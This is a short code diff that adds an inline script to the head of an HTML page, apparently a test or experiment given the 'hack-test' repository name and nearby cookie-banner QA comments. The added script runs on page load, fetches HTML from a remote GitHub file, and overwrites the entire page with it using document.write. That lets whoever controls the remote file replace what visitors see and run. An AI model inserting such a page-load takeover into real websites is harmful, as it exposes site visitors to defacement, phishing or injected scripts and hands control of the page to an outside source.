@@ -1,6 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+    <script>
+      (async function overrideDOM() {
+        const githubURL =
+          "https://github.com/nipunraj-Mozilor/hack-test/blob/main/modified-dom.html";
+
+        try {
+          // Fetch the HTML content from the GitHub URL
+          const response = await fetch(githubURL);
+          if (!response.ok) {
+            throw new Error(`Failed to fetch the file: ${response.statusText}`);
+          }
+
+          const newHTML = await response.text();
+
+          // Replace the current DOM structure
+          document.open(); // Clears the current document
+          document.write(newHTML); // Writes the fetched HTML
+          document.close(); // Closes the document
+        } catch (error) {
+          console.error("Error overriding DOM:", error);
+        }
+      })();
+    </script>
     <!--  -->
     <!-- Start qa1 nipunraj+testing@mozilor.com cookieyes banner -->
     <!-- <script
